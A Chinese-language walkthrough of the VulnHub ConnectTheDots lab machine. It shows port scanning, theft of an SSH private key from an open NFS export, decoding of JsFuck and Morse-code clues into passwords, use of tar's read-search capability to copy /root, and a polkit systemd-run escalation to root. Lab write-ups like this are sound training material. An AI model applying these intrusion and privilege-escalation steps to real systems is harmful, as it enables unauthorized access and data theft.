+++
date = '2026-11-11T19:24:56+08:00'
draft = false
title = '[VulnHub靶机]ConnectTheDots渗透记录'
tags = ['渗透','Vulnhub','Misc','polkit','FileCapability']
+++

## 主机发现&端口扫描

攻击机IP: 10.10.10.3  
靶机IP: 10.10.10.14

```shell
┌──(kali㉿kali)-[~/ConnectTheDots]
└─$ sudo arp-scan -l                       
Interface: eth0, type: EN10MB, MAC: 00:0c:29:5f:ca:d5, IPv4: 10.10.10.3
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.10.10.1      00:50:56:c0:00:08       VMware, Inc.
10.10.10.2      00:50:56:fc:41:2a       VMware, Inc.
10.10.10.14     00:0c:29:35:11:15       VMware, Inc.
10.10.10.254    00:50:56:e2:1e:6f       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.053 seconds (124.70 hosts/sec). 4 responded
```

探测开放端口

```shell
┌──(kali㉿kali)-[~/ConnectTheDots]
└─$ sudo nmap -sT --min-rate 10000 -p- 10.10.10.14 
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-11 19:27 +0800
Nmap scan report for 10.10.10.14
Host is up (0.00013s latency).
Not shown: 65526 closed tcp ports (conn-refused)
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
111/tcp   open  rpcbind
2049/tcp  open  nfs
7822/tcp  open  unknown
35059/tcp open  unknown
41327/tcp open  unknown
53261/tcp open  unknown
55149/tcp open  unknown
MAC Address: 00:0C:29:35:11:15 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.83 seconds
```

详细扫描

```shell
┌──(kali㉿kali)-[~/ConnectTheDots]
└─$ sudo nmap -sT -sV -sC -O -p21,80,111,2049,7822,35059,41327,53261,55149 10.10.10.14
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-11 19:28 +0800
Nmap scan report for 10.10.10.14
Host is up (0.00031s latency).

PORT      STATE SERVICE  VERSION
21/tcp    open  ftp      vsftpd 2.0.8 or later
80/tcp    open  http     Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Landing Page
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      38390/udp   mountd
|   100005  1,2,3      40827/udp6  mountd
|   100005  1,2,3      41303/tcp6  mountd
|   100005  1,2,3      53261/tcp   mountd
|   100021  1,3,4      33976/udp   nlockmgr
|   100021  1,3,4      35059/tcp   nlockmgr
|   100021  1,3,4      42731/tcp6  nlockmgr
|   100021  1,3,4      55370/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs      3-4 (RPC #100003)
7822/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey:
|   2048 38:4f:e8:76:b4:b7:04:65:09:76:dd:23:4e:b5:69:ed (RSA)
|   256 ac:d2:a6:0f:4b:41:77:df:06:f0:11:d5:92:39:9f:eb (ECDSA)
|_  256 93:f7:78:6f:cc:e8:d4:8d:75:4b:c2:bc:13:4b:f0:dd (ED25519)
35059/tcp open  nlockmgr 1-4 (RPC #100021)
41327/tcp open  mountd   1-3 (RPC #100005)
53261/tcp open  mountd   1-3 (RPC #100005)
55149/tcp open  mountd   1-3 (RPC #100005)
MAC Address: 00:0C:29:35:11:15 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.2 - 4.14 (97%), Linux 5.1 - 5.15 (95%), OpenWrt 19.07 (Linux 4.14) (94%), Linux 2.6.32 (94%), Linux 4.15 (94%), Linux 5.14 - 6.8 (94%), OpenWrt 21.02 (Linux 5.4) (94%), Linux 6.6 (94%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (94%), Linux 4.15 - 5.19 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.51 seconds
```

漏洞扫描

```shell
┌──(kali㉿kali)-[~/ConnectTheDots]
└─$ sudo nmap --script=vuln -p21,80,111,2049,7822,35059,41327,53261,55149 10.10.10.14
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-11 19:29 +0800
Nmap scan report for 10.10.10.14
Host is up (0.00026s latency).

PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
| http-internal-ip-disclosure:
|_  Internal IP Leaked: fe80::20c:29ff:fe35:1115
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-fileupload-exploiter:
|
|     Couldn't find a file-type field.
|
|     Couldn't find a file-type field.
|
|_    Couldn't find a file-type field.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-sql-injection: ERROR: Script execution failed (use -d to debug)
| http-enum:
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)'
|_  /manual/: Potentially interesting folder
111/tcp   open  rpcbind
2049/tcp  open  nfs
7822/tcp  open  unknown
35059/tcp open  unknown
41327/tcp open  unknown
53261/tcp open  unknown
55149/tcp open  unknown
MAC Address: 00:0C:29:35:11:15 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 28.65 seconds
```

## NFS服务信息收集

使用showmount查看NFS开放目录

```shell
┌──(kali㉿kali)-[~/ConnectTheDots]
└─$ showmount -e 10.10.10.14
Export list for 10.10.10.14:
/home/morris *
```

发现允许任何人访问, 将其挂载到攻击机中

```shell
┌──(kali㉿kali)-[~/ConnectTheDots]
└─$ sudo mount -t nfs 10.10.10.14:/home/morris /mnt/nfs -o nolock
```

查看目录内容

```shell
┌──(kali㉿kali)-[/mnt/nfs]
└─$ ls -lah                   
总计 56K
drwxr-xr-x  8 kali kali 4.0K 2019年10月11日 .
drwxr-xr-x  3 root root 4.0K 11月 7日 12:04 ..
-rw-------  1 kali kali    1 2019年10月11日 .bash_history
-rw-r--r--  1 kali kali  220 2019年10月11日 .bash_logout
-rw-r--r--  1 kali kali 3.5K 2019年10月11日 .bashrc
drwx------  9 kali kali 4.0K 2019年10月11日 .cache
drwx------ 10 kali kali 4.0K 2019年10月11日 .config
drwx------  3 kali kali 4.0K 2019年10月11日 .gnupg
-rw-------  1 kali kali 1.9K 2019年10月11日 .ICEauthority
drwx------  3 kali kali 4.0K 2019年10月11日 .local
-rw-r--r--  1 kali kali  807 2019年10月11日 .profile
drwx------  2 kali kali 4.0K 2019年10月11日 .ssh
drwxr-xr-x  2 kali kali 4.0K 2019年10月11日 Templates
-rw-------  1 kali kali   52 2019年10月11日 .Xauthority
```

在.ssh目录内发现公钥和私钥

```shell
┌──(kali㉿kali)-[/mnt/nfs/.ssh]
└─$ ls -lah
总计 16K
drwx------ 2 kali kali 4.0K 2019年10月11日 .
drwxr-xr-x 8 kali kali 4.0K 2019年10月11日 ..
-rw------- 1 kali kali 1.8K 2019年10月11日 id_rsa
-rw-r--r-- 1 kali kali  395 2019年10月11日 id_rsa.pub
```

查看公钥, 发现用户名`morris`

```shell
┌──(kali㉿kali)-[/mnt/nfs/.ssh]
└─$ cat id_rsa.pub   
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuTwJDj/B/FtGRkTEiwpoq52/jXtaeB2/R4+hyvAo6FuWeGvl+dvkgBkA5dL647UJXx6DUTh+xkZSav9BKOeSpZ2qcUP8lMf+H9j5LChu/E5B7dZEUDJAm8QzwJJIIDGhVoqdyVVL4kU8vOzdgLHjxj9VRsoHICuum6/SHDdTGUcQV1fFgYlZrrNcVeWZtEudN6PXF8JrjmGcLliVKRrntucCe/quT7HMHOcsnZDayumfKK/P/p825ZvnHtHPazgh41SmLbgltOz+V1NBYrGNPwrrZgZw2lKuDVExW+tRy5Qr9t92KS7JEE2626vNcG9DRpNDt9iRMWAfoGfloJ9Nf morris@sirrom
```

将私钥拷贝出来

```shell
┌──(kali㉿kali)-[/mnt/nfs/.ssh]
└─$ cp id_rsa /home/kali/ConnectTheDots
```

使用私钥和`morris`用户名尝试登录SSH, 注意根据Nmap扫描结果, SSH服务在7822端口而不是22

```shell
┌──(kali㉿kali)-[~/ConnectTheDots]
└─$ ssh morris@10.10.10.14 -i id_rsa -p 7822    
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
morris@10.10.10.14's password:
```

然而它仍然让我们输入密码, 只能先查看其它攻击面

## Web渗透

浏览器访问80服务, 阅读英文可知在提示我们网站有备份(backups)

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/ConnectTheDots%E8%AE%BF%E9%97%AE80%E6%9C%8D%E5%8A%A1.avif)

直接访问`/backups`, 发现是一个3秒长的视频, 上面有文字WHY

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/ConnectTheDots%E8%AE%BF%E9%97%AEbackups.avif)

查看主页源码, 发现注册页, 然而似乎没有做交互逻辑, 不能正常提交表单

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/ConnectTheDots%E5%8F%91%E7%8E%B0%E6%B3%A8%E5%86%8C%E9%A1%B5.avif)

查看上一级目录, 发现.cs扩展名文件

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/ConnectTheDots%E5%8F%91%E7%8E%B0cs%E6%89%A9%E5%B1%95%E5%90%8D%E6%96%87%E4%BB%B6.avif)

正常的bootstrap文件应该是js或css扩展名, .cs看上去很可疑, 点进去发现是JsFuck编码的JavaScript代码

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/ConnectTheDotsJsFuck.avif)

提取所有jsfuck代码(b1+b2+b3+b4+b5+b6+b7+b8+b9+b10), 运行得到凭据`TryToGuessThisNorris@2k19`

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/ConnectTheDotsJsFuck.avif)

使用`norris`作为用户名, `TryToGuessThisNorris@2k19`作为密码登录SSH

```shell
┌──(kali㉿kali)-[~/ConnectTheDots]
└─$ ssh norris@10.10.10.14 -p 7822
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
norris@10.10.10.14's password: 
Permission denied, please try again.
norris@10.10.10.14's password: 
Permission denied, please try again.
norris@10.10.10.14's password: 
Linux sirrom 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.

###
   #     #    #     #     #####     #      ##     #####     #    #    #   ####
   #     ##   #     #       #       #     #  #      #       #    ##   #  #    #
   #     # #  #     #       #       #    #    #     #       #    # #  #  #
   #     #  # #     #       #       #    ######     #       #    #  # #  #  ###
   #     #   ##     #       #       #    #    #     #       #    #   ##  #    #
  ###    #    #     #       #       #    #    #     #       #    #    #   ####

norris@sirrom:~$
```

读取user.txt, 获得第一面flag

```shell
norris@sirrom:~$ cat user.txt 
2c2836a138c0e7f7529aa0764a6414d0
```

## ftp信息收集

使用同样的凭据登录FTP服务

```shell
┌──(kali㉿kali)-[~/ConnectTheDots]
└─$ ftp 10.10.10.14
Connected to 10.10.10.14.
220 Welcome to Heaven!
Name (10.10.10.14:kali): norris
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

查看服务器上的内容

```shell
ftp> ls 
229 Entering Extended Passive Mode (|||33652|)
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 Oct 11  2019 files
226 Directory send OK.
ftp> cd files
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||50273|)
150 Here comes the directory listing.
-r--------    1 1001     1001         6301 Oct 11  2019 backups.bak
-r--------    1 1001     1001        39610 Oct 11  2019 game.jpg.bak
-r--------    1 1001     1001           29 Oct 11  2019 hits.txt.bak
-r--------    1 1001     1001       932659 Oct 11  2019 m.gif.bak
226 Directory send OK.
```

输入prompt关闭确认, 使用mget批量下载所有文件

```shell
ftp> prompt
Interactive mode off.
ftp> mget *
```

## 图片隐写与摩斯密码解密

使用exiftool查看图片元数据, 注意到Comment中存在摩斯密码

```shell
┌──(kali㉿kali)-[~/ConnectTheDots]
└─$ exiftool game.jpg.bak
ExifTool Version Number         : 13.55
File Name                       : game.jpg.bak
Directory                       : .
File Size                       : 40 kB
File Modification Date/Time     : 2019:10:11 10:16:38+08:00
File Access Date/Time           : 2026:11:11 20:59:45+08:00
File Inode Change Date/Time     : 2026:11:11 20:59:45+08:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 192
Y Resolution                    : 192
Exif Byte Order                 : Big-endian (Motorola, MM)
Orientation                     : Horizontal (normal)
Rendering Intent                : Perceptual
Pixel Units                     : 1
Pixels Per Unit X               : 7559
Pixels Per Unit Y               : 7559
Comment                         : .... . -.-- ....... -. --- .-. .-. .. ... --..-- ....... -.-- --- ..- .----. ...- . ....... -- .- -.. . ....... - .... .. ... ....... ..-. .- .-. .-.-.- ....... ..-. .- .-. ....... ..-. .- .-. ....... ..-. .-. --- -- ....... .... . .- ...- . -. ....... .-- .- -. -. .- ....... ... . . ....... .... . .-.. .-.. ....... -. --- .-- ..--.. ....... .... .- .... .- ....... -.-- --- ..- ....... ... ..- .-. . .-.. -.-- ....... -- .. ... ... . -.. ....... -- . --..-- ....... -.. .. -.. -. .----. - ....... -.-- --- ..- ..--.. ....... --- .... ....... -.. .- -- -. ....... -- -.-- ....... -... .- - - . .-. -.-- ....... .. ... ....... .- -... --- ..- - ....... - --- ....... -.. .. . ....... .- -. -.. ....... .. ....... .- -- ....... ..- -. .- -... .-.. . ....... - --- ....... ..-. .. -. -.. ....... -- -.-- ....... -.-. .... .- .-. --. . .-. ....... ... --- ....... --.- ..- .. -.-. -.- .-.. -.-- ....... .-.. . .- ...- .. -. --. ....... .- ....... .... .. -. - ....... .. -. ....... .... . .-. . ....... -... . ..-. --- .-. . ....... - .... .. ... ....... ... -.-- ... - . -- ....... ... .... ..- - ... ....... -.. --- .-- -. ....... .- ..- - --- -- .- - .. -.-. .- .-.. .-.. -.-- .-.-.- ....... .. ....... .- -- ....... ... .- ...- .. -. --. ....... - .... . ....... --. .- - . .-- .- -.-- ....... - --- ....... -- -.-- ....... -.. ..- -. --. . --- -. ....... .. -. ....... .- ....... .----. ... . -.-. .-. . - ..-. .. .-.. . .----. ....... .-- .... .. -.-. .... ....... .. ... ....... .--. ..- -... .-.. .. -.-. .-.. -.-- ....... .- -.-. -.-. . ... ... .. -... .-.. . .-.-.-
Image Width                     : 712
Image Height                    : 350
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 712x350
Megapixels                      : 0.249
```

使用在线工具解码, 得到下面的字符串

```text
HEYNORRIS,YOU'VEMADETHISFAR.FARFARFROMHEAVENWANNASEEHELLNOW?HAHAYOUSURELYMISSEDME,DIDN'TYOU?OHDAMNMYBATTERYISABOUTTODIEANDIAMUNABLETOFINDMYCHARGERSOQUICKLYLEAVINGAHINTINHEREBEFORETHISSYSTEMSHUTSDOWNAUTOMATICALLY.IAMSAVINGTHEGATEWAYTOMYDUNGEONINA'SECRETFILE'WHICHISPUBLICLYACCESSIBLE.
```

阅读可知靶机上存在SECRETFILE并且在编辑时断电了, 那么我们就需要获取它的swp文件  
通过SSH浏览靶机网站目录, 发现secretfile和.secretfile.swp, 然而swp文件只有www-data可读

```shell
norris@sirrom:/var/www/html$ ls -la
total 368
drwxr-xr-x 4 root     root       4096 Oct 11  2019 .
drwxr-xr-x 3 root     root       4096 Oct 11  2019 ..
-rw-r--r-- 1 www-data www-data   6301 Oct 11  2019 backups
-rw-r--r-- 1 www-data www-data    325 Oct 11  2019 backups.html
-rw-r--r-- 1 www-data www-data  78635 Oct 10  2019 bootstrap.bundle.min.js
-rw-r--r-- 1 www-data www-data 155758 Oct 10  2019 bootstrap.min.css
-rw-r--r-- 1 www-data www-data     44 Oct 11  2019 hits.txt
drwxr-xr-x 2 www-data www-data   4096 Oct 11  2019 images
-rw-r--r-- 1 www-data www-data   2186 Oct 11  2019 index.htm
-rw-r--r-- 1 www-data www-data   1964 Oct 11  2019 index.html
-rw-r--r-- 1 www-data www-data  71037 Oct 10  2019 jquery.slim.min.js
-rw-r--r-- 1 www-data www-data    879 Oct 11  2019 landing.css
drwxr-xr-x 2 www-data www-data   4096 Oct 11  2019 mysite
-rw-r--r-- 1 www-data www-data     99 Oct 11  2019 secretfile
-rw------- 1 www-data www-data  12288 Oct 11  2019 .secretfile.swp
norris@sirrom:/var/www/html$ cat secretfile 
I see you're here for the password. Holy Moly! Battery is dying !! Mentioning below for reference.
```

那么使用浏览器访问该文件, 即可下载到攻击机

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/ConnectTheDots%E4%B8%8B%E8%BD%BDswp%E6%96%87%E4%BB%B6.avif)

使用strings查看其内容

```text
I see you're here for the password. Holy Moly! Battery is dying !! Mentioning below for reference..

blehguessme090
```

`blehguessme090`很像密码, 我们看看靶机中有哪些带bash环境的用户

```shell
norris@sirrom:/var/www/html$ grep bash /etc/passwd
root:x:0:0:root:/root:/bin/bash
morris:x:1000:1000:morris,,,:/home/morris:/bin/bash
norris:x:1001:1001:norris,,,:/home/norris:/bin/bash
```

经过尝试, 最终以用户`morris`, 密码`blehguessme090`成功切换用户

```shell
norris@sirrom:/var/www/html$ su morris
Password:
morris@sirrom:/var/www/html$
```

## tar特殊能力获取flag

全盘查找具有特殊能力的可执行文件

```shell
/sbin/getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/tar = cap_dac_read_search+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/ping = cap_net_raw+ep
```

发现tar存在, `cap_dac_read_search+ep`权限
> cap_dac_read_search 是一种绕过文件读取权限检查的能力。拥有此能力的程序，即使以普通用户身份运行，也能无视标准的文件读取权限限制，直接读取任何文件，也能对目录执行读取和搜索（遍历）操作。  
> +ep 是附加在能力名后的标志，用于指定该能力在程序运行时的生效方式。它代表两个能力集（Capability Sets）：  
> * e (Effective，生效)：表示当这个可执行文件运行时，该能力会立即处于生效状态，进程可以立刻使用它。  
> * p (Permitted，允许)：表示该能力被允许存在于进程的能力集合中，是进程可以使用该能力的前提。一个能力必须先出现在   Permitted 集合中，才有可能进入 Effective 集合。  
>通常，+ep 一起使用，就是为了让程序在启动时自动获得并使用指定的能力。

尝试使用tar打包/root目录, 发现权限不足

```shell
morris@sirrom:~$ tar -cvf root.tar /root
bash: /usr/bin/tar: Permission denied
```

切回`norris`用户重新打包, 成功

```shell
norris@sirrom:~$ tar -cvf root.tar /root
tar: Removing leading `/' from member names
/root/
/root/root.txt
/root/.bashrc
/root/.gnupg/
/root/.gnupg/private-keys-v1.d/
/root/.bash_history
/root/.cache/
/root/.local/
/root/.local/share/
/root/.local/share/nano/
/root/.profile
```

解压即可得到`root.txt`

```shell
norris@sirrom:~$ tar -xvf root.tar 
root/
root/root.txt
root/.bashrc
root/.gnupg/
root/.gnupg/private-keys-v1.d/
root/.bash_history
root/.cache/
root/.local/
root/.local/share/
root/.local/share/nano/
root/.profile
norris@sirrom:~$ cat ./root/root.txt 
8fc9376d961670ca10be270d52eda423
```

## polkit提权

全盘查找SUID位文件

```shell
norris@sirrom:~$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
/usr/lib/xorg/Xorg.wrap
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/sbin/pppd
/usr/sbin/mount.nfs
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/chfn
/usr/bin/bwrap
/usr/bin/mount
/usr/bin/su
/usr/bin/pkexec
/usr/bin/ntfs-3g
/usr/bin/chsh
/usr/bin/sudo
```

> /usr/lib/policykit-1/polkit-agent-helper-1 是 Linux 系统中 polkit (PolicyKit) 授权框架的一个内部特权辅助程序。它本身不是供用户直接运行的工具，而是当某个应用程序需要请求管理员权限时，在后台默默处理密码验证等认证工作的“跑腿员”。  
> 当尝试进行需要特权的操作（例如用图形界面修改系统设置、挂载磁盘或启动 GParted）时，流程大致如下：  
> 1. 触发请求：应用程序向 polkitd 守护进程请求授权。  
> 2. 启动代理：polkitd 会通知你当前桌面环境中的认证代理（如 GNOME 或 KDE 的密码弹窗）来索要密码。  
> 3. 辅助验证：该代理会调用 polkit-agent-helper-1。这个助手程序的职责是 代表代理，通过系统的 PAM（可插拔认证模块）框架来验证你输入的密码。因为 PAM 通常需要高权限才能访问影子密码文件等资源，所以这个助手程序需要以特权方式运行。

使用systemd-run创建一个交互终端会话, 成功提权至root

```shell
norris@sirrom:~$ systemd-run -S
==== AUTHENTICATING FOR org.freedesktop.systemd1.manage-units ===
Authentication is required to manage system services or other units.
Authenticating as: norris,,, (norris)
Password: 
==== AUTHENTICATION COMPLETE ===
Running as unit: run-u53.service
Press ^] three times within 1s to disconnect TTY.
root@sirrom:/home/norris# tty
/dev/pts/2
root@sirrom:/home/norris# whoami
root
```
